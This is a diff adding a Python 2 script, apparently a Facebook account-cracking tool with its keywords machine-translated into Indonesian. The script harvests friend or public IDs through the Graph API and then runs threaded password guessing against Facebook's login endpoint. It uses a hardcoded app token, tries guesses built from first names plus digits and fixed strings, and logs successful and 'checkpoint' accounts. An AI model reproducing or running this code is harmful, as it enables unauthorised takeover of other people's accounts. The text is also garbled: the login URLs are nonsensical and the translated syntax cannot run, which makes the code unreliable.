+	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m Nama \ 033 [1; 91m: \ 033 [1; 92m" + nama + "\ 033 [ 1; 97 m "
+	cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93m ID \ 033 [1; 91m: \ 033 [1; 92m" + id + "\ x1b [ 1; 97 m "
+	cetak 42 * "\ 033 [1; 96m ="
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m1 \ x1b [1; 96m] \ x1b [1; 93m Mulai Peretasan"
+	cetak "\ x1b [1; 96m [\ x1b [1; 91m0 \ x1b [1; 96m] \ x1b [1; Keluar 91m"
+	pilih ()
+
+
+def pilih ():
+	unikers = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
+	jika unikers == "":
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih ()
+	elif unikers == "1":
+		super()
+	elif unikers == "0":
+		jalan ('Token Removed')
+		os.system ('rm -rf login.txt')
+		keluar ()
+	lain:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih ()
+
+
+def super ():
+	toket global
+	os.system ('jelas')
+	mencoba:
+		toket = open ('login.txt', 'r'). read ()
+	kecuali IOError:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91mToken tidak valid"
+		os.system ('rm -rf login.txt')
+		time.sleep (1)
+		Gabung()
+	os.system ('jelas')
+	cetak logo
+	cetak 42 * "\ 033 [1; 96m ="
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m1 \ x1b [1; 96m] \ x1b [1; 93m Retak Dari Daftar Teman"
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m2 \ x1b [1; 96m] \ x1b [1; 93m Retak Dari ID Publik Apa Pun"
+	cetak "\ x1b [1; 96m [\ x1b [1; 92m3 \ x1b [1; 96m] \ x1b [1; 93m Retak Dari File"
+	cetak "\ x1b [1; 96m [\ x1b [1; 91m0 \ x1b [1; 96m] \ x1b [1; 91m Kembali"
+	pilih_super ()
+
+def pilih_super ():
+	peak = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
+	jika puncak == "":
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih_super ()
+	elif peak == "1":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m ID Penerima \ 033 [1; 97m ...')
+		r = requests.get ("https://graph.facebook.com/me/friends?access_token=" + toket)
+		z = json.loads (r.text)
+		untuk s in z ['data']:
+			id.append (s ['id'])
+	elif peak == "2":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		idt = raw_input ("\ 033 [1; 96m [+] \ 033 [1; 93mEnter ID \ 033 [1; 91m: \ 033 [1; 97m")
+		mencoba:
+			jok = requests.get ("https://graph.facebook.com/" + idt + "? access_token =" + toket)
+			op = json.loads (jok.text)
+			cetak "\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 93mName \ 033 [1; 91m: \ 033 [1; 97m" + op ["name"]
+		kecuali KeyError:
+			cetak "\ 033 [1; 96m [!] \ x1b [1; 91mID Tidak Ditemukan!"
+			raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mBack \ 033 [1; 96m]")
+			super()
+		jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93mDapat ID \ 033 [1; 97m ...')
+		r = requests.get ("https://graph.facebook.com/" + idt + "/ friends? access_token =" + toket)
+		z = json.loads (r.text)
+		untuk saya dalam z ['data']:
+			id.append (i ['id'])
+	elif peak == "3":
+		os.system ('jelas')
+		cetak logo
+		cetak 42 * "\ 033 [1; 96m ="
+		mencoba:
+			idlist = raw_input ('\ x1b [1; 96m [+] \ x1b [1; 93mEnter File Path \ x1b [1; 91m: \ x1b [1; 97m')
+			untuk baris terbuka (idlist, 'r'). readlines ():
+				id.append (line.strip ())
+		kecuali IOError:
+			cetak '\ x1b [1; 96m [!] \ x1b [1; 91mFile Tidak Ditemukan'
+			raw_input ('\ n \ x1b [1; 96m [\ x1b [1; 97mBack \ x1b [1; 96m]')
+			super()
+	elif peak == "0":
+		Tidak bisa()
+	lain:
+		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
+		pilih_super ()
+	
+	cetak "\ 033 [1; 96m [+] \ 033 [1; 93mJumlah Total \ 033 [1; 91m: \ 033 [1; 97m" + str (len (id))
+	jalan ('\ 033 [1; 96m [✺] \ 033 [1; 93m Mulai \ 033 [1; 97m ...')
+	titik = ['. ',' .. ',' ... ']
+	untuk o di titik:
+		cetak ("\ r \ 033 [1; 96m [\ 033 [1; 97m✸ \ 033 [1; 96m] \ 033 [1; 93mMelacak \ 033 [1; 97m" + o),; sys.stdout.flush ( ); time.sleep (1)
+	mencetak
+	cetak ('\ x1b [1; 96m [!] \ x1b [1; 93mUntuk Menghentikan Proses Tekan CTRL Lalu Tekan z')
+	cetak 42 * "\ 033 [1; 96m ="
+	
+			
+	def main (arg):
+		cekpoint global, oks
+		pengguna = arg
+		mencoba:
+			os.mkdir ('keluar')
+		kecuali OSError:
+			lulus
+		mencoba:
+			a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads (a.text)
+			pass1 = ('786786')
+			data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&=) & password == password & user == password & user == password & user == password & user == password & user == password & user == password & user == password & password urus 'user_atau) (kata sandi) + passup & password = password = user + password = user + password = password + user = password + password = user & password = password + password = user & password = password = password + password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load (data)
+			jika 'access_token' di q:
+				cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass1
+				oks.append (pengguna + pass1)
+			lain:
+				jika 'www.facebook.com' di q ["error_msg"]:
+					cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass1
+					cek = open ("out / checkpoint.txt", "a")
+					cek.write (pengguna + "|" + pass1 + "\ n")
+					cek.close ()
+					cekpoint.append (pengguna + pass1)
+				lain:
+					pass2 = b ['first_name'] + '12345'
+					data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&=) & password == password & user == password & user == password & user == password & user == password & urus = user & urus == user & ur=intem = password = password & urus 'user =" password & password = password = user & password == user & password = password = password & password = password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+					q = json.load (data)
+					jika 'access_token' di q:
+						cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass2
+						oks.append (pengguna + pass2)
+					lain:
+						jika 'www.facebook.com' di q ["error_msg"]:
+							cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass2
+							cek = open ("out / checkpoint.txt", "a")
+							cek.write (pengguna + "|" + pass2 + "\ n")
+							cek.close ()
+							cekpoint.append (pengguna + pass2)
+						lain:
+							pass3 = b ['first_name'] + '123'
+							data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&=" kata sandi + URL + & urus== ur & user = password & urus 'user = "password & user == password & user == password & user == password & urus' user =" password & user == user & password = password = user & password = user + password = password = user & password = password = user & password == user & password = password + password = password & password urus) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+							q = json.load (data)
+							jika 'access_token' di q:
+								cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass3
+								oks.append (pengguna + pass3)
+							lain:
+								jika 'www.facebook.com' di q ["error_msg"]:
+									cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass3
+									cek = open ("out / checkpoint.txt", "a")
+									cek.write (pengguna + "|" + pass3 + "\ n")
+									cek.close ()
+									cekpoint.append (pengguna + pass3)
+								lain:
+									pass4 = 'Pakistan'
+									data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & urus==&&= urour) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+									q = json.load (data)
+									jika 'access_token' di q:
+										cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass4
+										oks.append (pengguna + pass4)
+									lain:
+										jika 'www.facebook.com' di q ["error_msg"]:
+											cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass4
+											cek = open ("out / checkpoint.txt", "a")
+											cek.write (pengguna + "|" + pass4 + "\ n")
+											cek.close ()
+											cekpoint.append (pengguna + pass4)
+										lain:
+											pass5 = b ['first_name'] + '12'
+											data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&&== password & ur=== urellib) ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+											q = json.load (data)
+											jika 'access_token' di q:
+												cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass5
+												oks.append (pengguna + pass5)
+											lain:
+												jika 'www.facebook.com' di q ["error_msg"]:
+													cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass5
+													cek = open ("out / checkpoint.txt", "a")
+													cek.write (pengguna + "|" + pass5 + "\ n")
+													cek.close ()
+													cekpoint.append (pengguna + pass5)
+												lain:
+													pass6 = b ['first_name'] + '1234'
+													data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2 password & password == + user == password & user == password & user == password & user == password & urus 'user =" password & user == user & password = password = user) & password = password = user & password = password = user & password = password = user & password == user & password == user & password = password = password & password = password = user == password & password = password == password ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+													q = json.load (data)
+													jika 'access_token' di q:
+														cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass6
+														oks.append (pengguna + pass6)
+													lain:
+														jika 'www.facebook.com' di q ["error_msg"]:
+															cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass6
+															cek = open ("out / checkpoint.txt", "a")
+															cek.write (pengguna + "|" + pass6 + "\ n")
+															cek.close ()
+															cekpoint.append (pengguna + pass6)
+														lain:
+															a = requests.get ('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads (a.text)
+															pass7 = b ['first_name'] + '1122'
+															data = urllib.urlopen ("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&=" kata sandi tempat + password & password) "password = user & user == password & user == password & user == password & user == password & user == password & password = password = user & password = password = user & password = password = user & password (password = user) & password == password & password = password = password & password urus ) + "& sdk = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load (data)
+															jika 'access_token' di q:
+																cetak '\ x1b [1; 96m [\ x1b [1; 92mSukses \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass7
+																oks.append (pengguna + pass7)
+															lain:
+																jika 'www.facebook.com' di q ["error_msg"]:
+																	cetak '\ x1b [1; 96m [\ x1b [1; 93mCheckpoint \ x1b [1; 96m] \ x1b [1; 97m' + pengguna + '\ x1b [1; 96m | \ x1b [1; 97m' + pass7
+																	cek = open ("out / checkpoint.txt", "a")
+																	cek.write (pengguna + "|" + pass7 + "\ n")
+																	cek.close ()
+																	cekpoint.append (pengguna + pass7)
+																	
+															
+		kecuali:
+			lulus
+		
+	p = ThreadPool (30)
+	p.map (utama, id)
+	cetak 42 * "\ 033 [1; 96m ="
+	print '\ 033 [1; 96m [\ 033 [1; 97m.2016 \ 033 [1; 96m] \ 033 [1; 92mProses Telah Selesai \ 033 [1; 97m ....'
+	cetak "\ 033 [1; 96m [+] \ 033 [1; 92mTotal OK / \ x1b [1; 93mCP \ 033 [1; 91m: \ 033 [1; 92m" + str (len (oks)) + "\ 033 [1; 97m / \ 033 [1; 93m "+ str (len (cekpoint))
+	cetak ("\ 033 [1; 96m [+] \ 033 [1; File 92mCP Telah Disimpan \ 033 [1; 91m: \ 033 [1; 97mout / checkpoint.txt")
+	raw_input ("\ n \ 033 [1; 96m [\ 033 [1; 97mBack \ 033 [1; 96m]")
+	Tidak bisa()
+
+if __name__ == '__main__':
+	Gabung()
